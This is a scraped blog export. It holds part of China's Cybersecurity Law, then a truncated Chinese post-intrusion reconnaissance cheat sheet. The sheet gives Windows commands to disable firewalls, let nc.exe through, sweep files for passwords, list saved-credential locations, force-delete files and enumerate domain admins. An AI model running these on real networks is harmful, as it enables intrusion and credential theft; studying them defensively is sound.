国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改： （一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； （二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； （三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； （四）采取数据分类、重要数据备份和加密等措施； （五）法律、行政法规规定的其他义务。 第二十二条 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。 网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 第二十三条 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 第二十四条 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。 国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 第二十五条 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 第二十七条 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 第二十八条 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。 第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。 有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。 第三十二条 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 第三十三条 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： （一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； （二）定期对从业人员进行网络安全教育、技术培训和技能考核； （三）对重要系统和数据库进行容灾备份； （四）制定网络安全事件应急预案，并定期进行演练； （五）法律、行政法规规定的其他义务。 第三十五条 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 第三十六条 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 第三十七条 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 第三十八条 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： （一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估； （二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力； （三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享； （四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 第四章 网络信息安全 第四十条 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 第四十一条 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。 网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 第四十二条 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。 网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 第四十三条 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 第四十四条 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 第四十五条 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 第四十六条 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 第四十七条 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 第四十八条 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。 电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 第四十九条 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。 第五十条 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。 第五章 监测预警与应急处置 第五十一条 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 第五十二条 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 第五十三条 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。 负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。 网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 第五十四条 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施： （一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； （二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； （三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 第五十五条 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。 第五十六条 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 第五十七条 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。 第五十八条 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 第六章 法律责任 第五十九条 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。 关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 第六十条 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： （一）设置恶意程序的； （二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； （三）擅自终止为其产品、服务提供安全维护的。 第六十一条 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十二条 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。 第六十三条 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 第六十四条 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。 违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 第六十五条 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十六条 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 第六十七条 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。 单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 第六十八条 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 第六十九条 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款： （一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； （二）拒绝、阻碍有关部门依法实施的监督检查的； （三）拒不向公安机关、国家安全机关提供技术支持和协助的。 第七十条 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 第七十一条 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 第七十二条 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 第七十三条 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。 网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 第七十四条 违反本法规定，给他人造成损害的，依法承担民事责任。 违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。 第七十五条 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。 第七章 附则 第七十六条 本法下列用语的含义： （一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 （二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 （三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 （四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 （五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。 第七十七条 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。 第七十八条 军事网络的安全保护，由中央军事委员会另行规定。 第七十九条 本法自2017年6月1日起施行。","link":"/2017/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"},{"title":"内网渗透|内网中的信息收集","text":"无论是通过外网打点，还是水坑钓鱼，进入内网后的第一步，也是最重要的一步就是信息收集，而且信息收集往往是一直穿插在整个内网渗透过程中。 工作组和域的区分12345678910111213141516171819202122232425262728293031323334351.ipconfig /all有Primary Dns Suffix（主 DNS 后缀）就说明是域内，空的则当前机器应该在工作组。2.net config workstation =工作组特征=------------------------------------------------软件版本 Windows 10 Home China工作站域 WORKGROUP登录域 MicrosoftAccount------------------------------------------------=域特征=------------------------------------------------工作站域 HACK7工作站域 DNS 名称 hack7.local登录域 HACK7------------------------------------------------3.systeminfo这里注意字体大小写，工作组一般都是全大写，但是遇到的也有小写的情况，暂时不明白怎么设置的=工作组特征=------------------------------------------------域: WORKGROUP------------------------------------------------=域特征=------------------------------------------------域: hack7.local------------------------------------------------4.net time /domain=工作组特征=------------------------------------------------找不到域 WORKGROUP 的域控制器。请键入 NET HELPMSG 3913 以获得更多的帮助。------------------------------------------------=域特征=[需要域用户才能成功查询]------------------------------------------------\\\\DC.hack7.local的当前时间是2020/7/12 13:21:32------------------------------------------------ 工作组内信息收集工作组采取的一般都是常规渗透方法，因为工作组一般都是个人和少数服务器。 123456789通常使用的方法有：扫描网段中的web服务，常用的有phpstudy，wampserver等，来寻找搭建的服务漏洞扫描开放端口信息，以及对应的服务，判断是否存在漏洞。扫描主机由于没有更新到最新版本导致的系统漏洞，比如MS17-010，补丁号为KB4013389hash抓取，hash注入，hash碰撞，口令爆破，IPC登陆，WMI，未授权访问，文件共享系统。ARP嗅探/欺骗攻击（Cain和Ettercap）DNS劫持，会话劫持。社会工程学... 本机信息收集用户系统信息收集123456789101112131415161718192021222324252627282930313233343536373839404142431.查看当前用户权限whoami /all2.查看系统信息systeminfosysteminfo /S 192.168.1.101 /U testlab\\test /P &quot;test&quot; 查看远程机器的系统配置3.查当前机器的机器名,知道当前机器是干什么的hostname4.查看在线用户,注意管理员此时在不在quserquery userqwinsta5.查当前机器中所有的用户名,开始搜集准备用户名字典net user6.查当前机器中所有的组名,了解不同组的职能,如：IT,HR,admin,filenet localgroup7.查指定组中的成员列表net localgroup &quot;Administrators&quot;8.查询本机所有的盘符wmic logicaldisk get description,name,size,freespace /valuefsutil fsinfo drives 需要管理员权限fsutil fsinfo volumeinfo C:|findstr &quot;卷名&quot; 查看卷名称，需要管理员权限9.防火墙相关netsh firewall show state 查看防火墙状态netsh firewall show config 查看防火墙配置设置防火墙日志存储位置：netsh advfirewall set currentprofile logging filename &quot;C:\\Windows\\temp\\FirewallLOG.log&quot;关闭防火墙：netsh firewall get opmode disable (WIN2003之前)netsh advfirewall set allprofiles state off (WIN2003之后)允许某个程序的全连接：netsh firewall add allowdprogram C:\\nc.exe &quot;allow nc&quot; enable (WIN2003之前)允许某个程序连入：netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;允许某个程序外连：netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;10.其他set 查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境ver 查看当前机器的NT内核版本,不弹窗winver 查看当前机器的NT内核版本,弹窗，在非图形界面不执行这个命令net share 查看当前机器开启的共享driverquery 查看当前机器安装的驱动列表net share public_dir=&quot;c:\\public&quot; /grant:Everyone,Full 设置共享dir /a-r-d /s /b 找当前用户可读写目录,回显可能会很多 网络连接信息收集123456789101112131415161.查看tcp/udp网络连接状态信息netstat -ano 查看本机所有的tcp,udp端口连接及其对应的pidnetstat -anob 查看本机所有的tcp,udp端口连接,pid及其对应的发起程序netstat -ano | findstr &quot;ESTABLISHED&quot; 查看当前正处于连接状态的端口及ipnetstat -ano | findstr &quot;LISTENING&quot; 查看当前正处于监听状态的端口及ipnetstat -ano | findstr &quot;TIME_WAIT&quot; 查看当前正处于等待状态的端口及ip2.查看网络配置ipconfig /all3.查看本地DNS缓存ipconfig /displaydns4.查看路由表route print5.查找有价值的内网arp通信记录arp -a6.跟踪本机出口iptracert 8.8.8.8 软件进程信息收集12345678910111.查看杀毒软件wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe2.查看本机安装程序wmic product get name /valuewmic product get name,version3.查看当前机器的进程信息tasklist /svc 显示当前机器所有的进程所对应的服务 [只限于当前用户有权限看到的进程]tasklist /m 显示本地所有进程所调用的dll [同样只限于当前用户有权限看到的进程]tasklist /v 寻找进程中有无域管启用的进程，或者杀软进程tasklist /S 192.168.1.1 /U testlab\\test /P &quot;test&quot; 查看远程主机进程列表taskkill /im iexplore.exe /f 用指定进程名的方式强行结束指定进程 历史凭证信息收集123456789101112131415161718192021引用自：https://github.com/klionsec/RedTeamer批量抓取当前机器上的 &quot;各类基础服务配置文件中保存的各种账号密码&quot; 比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...想办法 &quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot; 比如, *.ls,*.doc,*.docx, *.txt....抓取各类 &quot;数据库客户端工具中保存各种数据库连接账号密码 比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]抓取当前系统 &quot;注册表中保存的各类账号密码hash&quot; [ Windows ]抓取当前系统所有 &quot;本地用户的明文密码/hash&quot; [ Windows &amp; linux ]抓取当前系统的所有 &quot;用户token&quot; [ Windows ]抓取 &quot;windows凭据管理器中保存的各类连接账号密码&quot;抓取 &quot;MSTSC 客户端中保存的所有rdp连接账号密码&quot;抓取各类 &quot;VNC客户端工具中保存的连接密码&quot;抓取 &quot;GPP目录下保存的各类账号密码&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]抓取各类 &quot;SSH客户端工具中保存的各种linux系统连接账号密码&quot;, SecureCRT,Xshell,WinSCP,putty抓取各类 &quot;浏览器中保存的各种web登录密码和cookie信息&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器抓取各类 &quot;数据库表中保存的各类账号密码hash&quot;抓取各类 &quot;FTP客户端工具中保存的各种ftp登录账号密码&quot;, filezila, xftp...抓取各类 &quot;邮件客户端工具中保存的各种邮箱账号密码&quot;, forxmail, thunderbird...抓取各类 &quot;SVN客户端工具中保存的所有连接账号密码及项目地址&quot;抓取各类 &quot;VPN客户端工具中保存的各种vpn链接账号密码&quot; 用户敏感文件收集1234567891011121314151617181920212223242526271.查看本机hosts文件type c:\\Windows\\system32\\drivers\\etc\\hosts2.指定目录下搜集各类敏感文件dir /a /s /b d:\\&quot;*.txt&quot;dir /a /s /b d:\\&quot;*.xml&quot;dir /a /s /b d:\\&quot;*.mdb&quot;dir /a /s /b d:\\&quot;*.sql&quot;dir /a /s /b d:\\&quot;*.mdf&quot;dir /a /s /b d:\\&quot;*.eml&quot;dir /a /s /b d:\\&quot;*.pst&quot;dir /a /s /b d:\\&quot;*conf*&quot;dir /a /s /b d:\\&quot;*bak*&quot;dir /a /s /b d:\\&quot;*pwd*&quot;dir /a /s /b d:\\&quot;*pass*&quot;dir /a /s /b d:\\&quot;*login*&quot;dir /a /s /b d:\\&quot;*user*&quot;3.指定目录下的文件中搜集各种账号密码findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bakfindstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak4.查看,删除 指定文件type c:\\windows\\temp\\admin_pass.bak 查看某个文件内容del d:\\ad\\*.* /a /s /q /f 强制删除指定路径下的所有文件tree /F /A D:\\ &gt;&gt; file_list.txt 导出指定路径下的文件目录结构rd /q/s c:\\windows\\temp\\test 删除文件夹 存活主机探测基于icmp 1for /L %I in (0,1,254) DO @ping -w 1 -n 1 192.168.7.%I | findstr &quot;TTL=&quot; &gt;&gt; pinglive.txt 不确定情况下，常见内网ip探测（来源：https://mp.weixin.qq.com/s/AUgBlRjH_USaZXgmMDYzSg ） 1234567891011121314151617181920212223242526@echo offrem 内网存活段自动发现脚本 [Windows] rem By Klionrem 2020.7.1setlocal enabledelayedexpansionfor /l %%i in (0,1,255) do ( for /l %%k in (0,1,255) do ( ping -w 1 -n 1 10.%%i.%%k.1 | findstr &quot;TTL=&quot; &gt;nul || ping -w 1 -n 1 10.%%i.%%k.254 | findstr &quot;TTL=&quot; &gt;nul if !errorlevel! equ 0 (echo 10.%%i.%%k.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 10.%%i.%%k.0/24 May be sleeping ! ) ))for /l %%s in (16,1,31) do ( for /l %%d in (0,1,255) do ( ping -n 1 -w 1 172.%%s.%%d.1 | findstr &quot;TTL=&quot; &gt;nul || ping -w 1 -n 1 172.%%s.%%d.254 | findstr &quot;TTL=&quot; &gt;nul if !errorlevel! equ 0 (echo 172.%%s.%%d.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 172.%%s.%%d.0/24 May be sleeping ! ) ))for /l %%t in (0,1,255) do ( ping -n 1 -w 1 192.168.%%t.1 | findstr &quot;TTL=&quot; &gt;nul || ping -n 1 -w 1 192.168.%%t.254 | findstr &quot;TTL=&quot; &gt;nul if !errorlevel! equ 0 (echo 192.168.%%t.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 192.168.%%t.0/24 May be sleeping ! )) 扫描的话建议直接在内网进行扫描，速度和准确率都比较有保障，做扫描之前尽量确定下内网是否有流量监控设备，或者把动静做到最小，管理员发现后很可能会直接断网或采取其他措施丢失当前主机权限。 12常用的工具[最多10秒一个c段]：nbtscan[基于smb和netbios的内网主机发现方式]、Ladon、fscan、自开发工具...socks代理扫描：goby、railgun 端口信息探测Ladon8.2更新功能 相关分析：基于NTLM探测Windows版本信息(https://mp.weixin.qq.com/s/yBFGrb9D8nmO0KLGjYds8g) 123456[+] WmiInfo (135)[+] SmbInfo (445)[+] WinrmInfo (5985/80/8080/443)[+] MssqlInfo (1433)[+] ExchangeInfo (443)[+] RdpInfo (3389) 域内信息收集下文仅限于域内的信息收集，均不会涉及域内认证原理等概念，后面会对windows认证方式单独写一篇总结。 net组件搜集域内信息12345678910111213141516171819202122232425262728293031323334net user /domain 查看当前域中的所有用户名，根据用户名总数大概判断域的规模net user xingzheng /domain 查看指定用户在当前域中的详细属性信息net accounts /domain 查看当前域的域内账户密码设置策略，密码长短，错误锁定等信息net config workstation 查看当前的登录域net view 查看当前域中在线的机器，不太直观，批处理把机器名对应的ip也显示出来----host2ip.bat:先获取机器名保存为computers.txt，然后运行下面的脚本得到pic.csv@echo offclsecho Useage: %0 computers.txtfor /f %%a in (%1) do ( echo ping %%a -4 -n 1 |find /i &quot;ping&quot; &gt;&gt; log.txt ping %%a -4 -n 1 |find /i &quot;ping&quot; &gt; %%a.txt for /f &quot;tokens=2 delims=[]&quot; %%b in (%%a.txt) do ( @echo %%a,%%b &gt;&gt; pic.csv del /f /q %%a.txt ))echo end &gt;&gt; end.txt----WIN10下使用Net view会出现如下报错System error 1231System error 6118解决：https://social.technet.microsoft.com/Forums/en-US/6f102ed1-8e76-4cb7-8dec-05714466d441/net-view-system-error-1231?forum=win10itpronetworking----net view /domain 查看内网种所有的域数量和名称net view /domain:domain_name 查看指定域中在线的计算机列表net time /domain 查看时间服务器，一般域控会做时间服务器net group /domain 查看当前域中的所有组名net group &quot;domain admins&quot; /domain 查看当前域中的域管账户net group &quot;enterprise admins&quot; /domain 查看当前域中企业管理员组用户net group &quot;domain computers&quot; /domain 查看当前域中的所有的计算机名（登录过该域的计算机）net group &quot;domain controllers&quot; /domain 查看域控制器主机名net group &quot;exchange servers&quot; /domain 查看域内是否存在Exchange 其他补充12345678wmic useraccount get Caption,sid 获取域内所有用户sidnltest /domain_trusts 查看域内信任关系nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt; 查询指定server的信任域nltest /dsgetdc:&lt;域名&gt; /server:&lt;域控ip&gt; 查询域详细信息nltest /dclist:&lt;域名&gt; 列出域控制器nslookup -q=mx hack7.local 查看域内邮件服务器nslookup -q=ns hack7.local 查看域内DNS服务器netdom query pdc 查看域内的主域控，仅限win2008及之后的系统 dsquery导出域信息利用dsquery 工具搜集域内信息，域成员机器需要自己传上去 1234567dsquery computer 查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquerydsquery user 查看当前域中的所有账户名dsquery group 查看当前域内的所有组名dsquery subnet 查看到当前域所在的网段，结合nbtscan使用dsquery site 查看域内所有的web站点dsquery server 查看当前域中的服务器(一般结果只有域控的主机名)dsquery user domainroot -name admin* -limit 240 查询前240个以admin开头的用户名 csvde导出域信息1234如果你有一个当前有效的域用户账户及密码csvde.exe -f 